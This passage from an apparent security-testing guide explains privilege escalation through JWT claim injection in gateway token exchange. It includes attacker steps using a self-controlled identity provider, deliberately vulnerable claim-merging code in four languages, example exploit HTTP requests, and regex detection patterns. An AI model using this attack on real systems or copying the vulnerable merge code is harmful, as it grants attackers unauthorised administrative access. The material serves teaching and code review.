Identify the enterprise's Identity Federation architecture. When third-party vendors or multi-tenant B2B partners interact with the API, they authenticate using their own Identity Providers (e.g., Auth0, Azure AD)
{% endstep %}

{% step %}
Understand the OAuth 2.0 Token Exchange (RFC 8693) optimization: Instead of requiring hundreds of internal microservices to maintain trust lists of external IdP JWKS URIs, the API Gateway intercepts the external JWT, validates it, and mints a unified, highly privileged "Internal JWT" signed by the Gateway's own private key. Downstream microservices exclusively trust this Internal JWT
{% endstep %}

{% step %}
Investigate the Token Mapping Pipeline inside the API Gateway. Observe how claims from the external JWT are translated into the Internal JWT
{% endstep %}

{% step %}
Discover the scaling optimization: Instead of manually writing 50 lines of code to explicitly map `given_name`, `email`, `department`, `location`, and `custom_attributes` for every new B2B partner, developers utilize a dynamic merge strategy (e.g., `Object.assign()`, `Map.putAll()`, or `array_merge()`)
{% endstep %}

{% step %}
The pipeline blindly copies _all_ claims from the external JWT into the internal JWT template, manually overwriting only the strictly required routing claims (like `iss` and `aud`), but failing to implement a rigid "Deny List" or explicit schema projection for internal authorization claims
{% endstep %}

{% step %}
Examine the downstream microservices to determine their authorization logic. Notice they rely on an internal claim, such as `"system_roles": ["Admin"]` or `"is_internal_service": true`, embedded inside the Internal JWT by the API Gateway
{% endstep %}

{% step %}
Setup a free, attacker-controlled Identity Provider (e.g., an Okta developer tenant) and configure an enterprise OIDC connection with the target API Gateway
{% endstep %}

{% step %}
Inside your attacker IdP, configure the Token Emission pipeline to inject a custom claim into your outbound JWTs. Name this claim exactly what the downstream microservice expects (e.g., `"system_roles": ["Enterprise_Admin"]`)
{% endstep %}

{% step %}
Initiate an authentication flow. Your external IdP signs the JWT containing the malicious custom claim and sends it to the API Gateway
{% endstep %}

{% step %}
The Gateway validates your external signature perfectly. The dynamic Token Mapping pipeline extracts your claims, blindly merges them into the internal payload, overwrites the `iss` to `internal-gateway`, and cryptographically signs the new token
{% endstep %}

{% step %}
The API Gateway forwards the poisoned Internal JWT to the downstream microservice. The microservice validates the gateway's signature, reads the shadowed `system_roles` claim originally injected by your IdP, and grants full administrative access
{% endstep %}

{% step %}
**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:internalClaims\.(?:AddRange|Add|UnionWith)\s*\(|internalClaims\s*=\s*new\s*(?:Dictionary|Dictionary<string,\s*object>|Dictionary<string,\s*string>)\s*\([^)]*externalClaims|externalClaims\s*\.(?:ToDictionary|ToList)\s*\(|ClaimsIdentity\s*\([^)]*externalClaims|ClaimsPrincipal\s*\([^)]*ClaimsIdentity|claims(?:Identity)?\.(?:AddClaim|AddClaims)\s*\(|externalClaims\s*=>\s*internalClaims)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:internalClaims\.(?:putAll|put|putIfAbsent)\s*\(|new\s+HashMap\s*<[^>]*>\s*\(\s*externalClaims\s*\)|new\s+HashMap\s*\(\s*externalClaims\s*\)|claims\.putAll\s*\(|CollectionUtils\.mergePropertiesIntoMap\s*\(|JwtClaimsSet\.Builder\b[\s\S]{0,120}?(?:claim|claims)|OAuth2User\b[\s\S]{0,120}?getAttributes)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$internalClaims\s*=\s*array_merge\s*\(\s*\$externalClaims|array_merge\s*\(\s*\$externalClaims\s*,|array_replace\s*\(\s*\$internalClaims\s*,\s*\$externalClaims|collect\s*\(\s*\$externalClaims\s*\)|Auth::user\(\)->getAttributes\s*\(|->claims\s*\(\s*\$externalClaims)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:Object\.assign\s*\(\s*\{\s*\}\s*,\s*externalClaims|Object\.assign\s*\(\s*internalClaims\s*,\s*externalClaims|(?:\.\.\.\s*externalClaims)|lodash\.merge\s*\(|merge\s*\(\s*internalClaims\s*,\s*externalClaims|jwt\.decode\s*\([^)]*\)[\s\S]{0,120}?(?:Object\.assign|merge)|passport\.profile\b)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:internalClaims\.(?:AddRange|Add|UnionWith)\s*\(|internalClaims\s*=\s*new\s*(?:Dictionary|Dictionary<string,\s*object>|Dictionary<string,\s*string>)\s*\([^)]*externalClaims|externalClaims\s*\.(?:ToDictionary|ToList)\s*\(|ClaimsIdentity\s*\([^)]*externalClaims|ClaimsPrincipal\s*\([^)]*ClaimsIdentity|claims(?:Identity)?\.(?:AddClaim|AddClaims)\s*\(|externalClaims\s*=>\s*internalClaims)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:internalClaims\.(?:putAll|put|putIfAbsent)\s*\(|new\s+HashMap\s*<[^>]*>\s*\(\s*externalClaims\s*\)|new\s+HashMap\s*\(\s*externalClaims\s*\)|claims\.putAll\s*\(|CollectionUtils\.mergePropertiesIntoMap\s*\(|JwtClaimsSet\.Builder.*(?:claim|claims)|OAuth2User.*getAttributes)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$internalClaims\s*=\s*array_merge\s*\(\s*\$externalClaims|array_merge\s*\(\s*\$externalClaims\s*,|array_replace\s*\(\s*\$internalClaims\s*,\s*\$externalClaims|collect\s*\(\s*\$externalClaims\s*\)|Auth::user\(\)->getAttributes\s*\(|->claims\s*\(\s*\$externalClaims)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:Object\.assign\s*\(\s*\{\s*\}\s*,\s*externalClaims|Object\.assign\s*\(\s*internalClaims\s*,\s*externalClaims|(?:\.\.\.\s*externalClaims)|lodash\.merge\s*\(|merge\s*\(\s*internalClaims\s*,\s*externalClaims|jwt\.decode\s*\([^)]*\).*(?:Object\.assign|merge)|passport\.profile\b)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TokenExchangeService : ITokenExchangeService
{
    private readonly IJwtGenerator _jwtGenerator;

    public string ExchangeExternalToken(JwtSecurityToken externalToken)
    {
        // [1]
        // [2]
        var internalClaims = new Dictionary<string, object>(
            externalToken.Payload.ToDictionary(k => k.Key, v => v.Value)
        );

        // [3]
        internalClaims["iss"] = "Internal-API-Gateway";
        internalClaims["aud"] = "Downstream-Microservices";
        internalClaims["exchange_time"] = DateTime.UtcNow;

        // [4]
        return _jwtGenerator.SignInternalToken(internalClaims);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class TokenExchangeService {

    @Autowired
    private JwtGenerator jwtGenerator;

    public String exchangeExternalToken(DecodedJWT externalToken) {
        // [1]
        // [2]
        Map<String, Object> internalClaims = new HashMap<>();
        externalToken.getClaims().forEach((key, claim) -> internalClaims.put(key, claim.as(Object.class)));

        // [3]
        internalClaims.put("iss", "Internal-API-Gateway");
        internalClaims.put("aud", "Downstream-Microservices");
        internalClaims.put("exchange_time", Instant.now().toString());

        // [4]
        return jwtGenerator.signInternalToken(internalClaims);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class TokenExchangeService 
{
    protected $jwtGenerator;

    public function exchangeExternalToken(array $externalPayload): string 
    {
        // [1]
        // [2]
        // [3]
        $internalClaims = array_merge($externalPayload, [
            'iss' => 'Internal-API-Gateway',
            'aud' => 'Downstream-Microservices',
            'exchange_time' => time()
        ]);

        // [4]
        return $this->jwtGenerator->signInternalToken($internalClaims);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class TokenExchangeService {
    constructor(jwtGenerator) {
        this.jwtGenerator = jwtGenerator;
    }

    exchangeExternalToken(externalPayload) {
        // [1]
        // [2]
        // [3]
        let internalClaims = Object.assign({}, externalPayload, {
            iss: 'Internal-API-Gateway',
            aud: 'Downstream-Microservices',
            exchange_time: Date.now()
        });

        // [4]
        return this.jwtGenerator.signInternalToken(internalClaims);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway has successfully validated the external JWT against the B2B partner's public keys. It now prepares to mint the trusted internal token, \[2] To eliminate the engineering overhead of manually mapping custom claims (e.g., custom SSO profile attributes required by various internal reporting services), the developer initializes the internal claims dictionary using a complete, blind copy of the external payload, \[3] The pipeline manually overwrites specific routing claims (Issuer, Audience) to ensure the token is technically valid within the internal mesh architecture, \[4] The fatal boundary collapse. The Gateway signs the token using the highly trusted internal master key. Because there is no explicit sanitization, any custom claims injected by the attacker's external Identity Provider (e.g., `system_roles`) are perfectly preserved and cryptographically sealed under the internal Gateway's signature, transforming untrusted external metadata into authoritative internal authorization claims

```http
// 1. Attacker configures their custom IdP to emit a JWT containing:
// { "sub": "attacker", "email": "a@b.com", "system_roles": ["SuperAdministrator"] }

// 2. Attacker initiates the OAuth login flow, presenting their external token to the API Gateway.
POST /api/v1/auth/exchange HTTP/1.1
Host: gateway.enterprise.tld
Content-Type: application/json

{"external_token": "eyJhb...[ATTACKERS_EXTERNAL_JWT]..."}

// 3. The Gateway validates the external token, applies the blind mapping logic, and returns the newly minted Internal Token.
HTTP/1.1 200 OK
Content-Type: application/json

{"internal_token": "eyJhb...[INTERNAL_GATEWAY_SIGNED_JWT]..."}
```

```http
// 4. Attacker decodes the Internal JWT and verifies the shadowed claim survived the exchange.
// Payload: { "sub": "attacker", "email": "a@b.com", "system_roles": ["SuperAdministrator"], "iss": "Internal-API-Gateway" }

// 5. Attacker accesses downstream microservices using the internal token.
GET /api/v1/billing/global-export HTTP/1.1
Host: downstream-billing.enterprise.tld
Authorization: Bearer eyJhb...[INTERNAL_GATEWAY_SIGNED_JWT]...
```
{% endstep %}

{% step %}
The architectural implementation of RFC 8693 Token Exchange intended to shield downstream microservices from the complexity of multi-tenant JWKS validation. To optimize developer velocity and dynamically support arbitrary SSO claims from diverse B2B partners, the API Gateway utilized an unconstrained object-merge pipeline. The attacker leverages this logic by injecting highly specific, authoritative internal claim keys (like `system_roles`) into their Bring-Your-Own Identity Provider. The Gateway blindly copies the malicious external claim, cryptographically re-signs the payload with the trusted internal master key, and produces a mathematically valid administrator token. When presented to downstream services, the architecture trusts the Gateway's signature implicitly, granting the attacker complete privilege escalation without exploiting any cryptographic flaws in the JWT standard itself
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
